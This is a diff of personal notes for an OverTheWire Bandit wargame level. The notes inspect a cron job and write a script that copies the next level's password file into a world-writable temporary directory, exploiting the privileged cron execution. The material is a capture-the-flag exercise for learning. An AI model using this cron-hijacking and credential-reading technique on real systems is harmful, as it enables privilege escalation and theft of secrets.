@@ -4,21 +4,17 @@ ls /etc/cron.d
 cat /etc/cron.d/cronjob_bandit24
 cat /usr/bin/cronjob_bandit24.sh
 
-
-should be this but doesnt workk
-
-
 mktemp -d
-cd /tmp/tmp.h6R6snutVu
+cd /tmp/tmp.gbpeIlV2hg
 nano bandit24_pass.sh
 
 `#!/bin/bash
-cat /etc/bandit_pass/bandit24 > /tmp/tmp.h6R6snutVu/password`
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.gbpeIlV2hg/password`
 
 cat bandit24_pass.sh
 chmod +rx bandit24_pass.sh
-chmod 777 /tmp/tmp.ljEyl6kv1M
-chmod 777 /tmp/tmp.h6R6snutVu
+chmod 777 /tmp/tmp.gbpeIlV2hg
+chmod 777 /tmp/tmp.gbpeIlV2hg
 touch password
 chmod +rwx password
 
